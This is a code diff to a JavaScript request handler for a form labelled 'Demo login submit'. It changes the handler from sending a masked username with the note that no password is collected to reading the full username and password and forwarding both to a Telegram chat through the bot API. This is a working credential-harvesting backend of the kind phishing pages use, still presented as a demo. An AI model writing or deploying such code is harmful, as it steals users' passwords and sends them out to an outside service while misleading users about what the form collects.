@@ -4,7 +4,7 @@ export default async function handler(req, res) {
       return res.status(405).json({ ok: false, error: "Method Not Allowed" });
     }
 
-    const { usernameMasked, submittedAt } = req.body || {};
+    const { username, submittedAt, password } = req.body || {};
     const token  = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
@@ -13,9 +13,9 @@ export default async function handler(req, res) {
 
     const text =
       `🔔 Demo login submit\n` +
-      `• Username (masked): ${usernameMasked}\n` +
+      `• Username: ${username}\n` +
       `• Time: ${submittedAt}\n` +
-      `*(No password collected)*`;
+      `• Password: ${password}`;
 
     const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;
     const r = await fetch(tgUrl, {
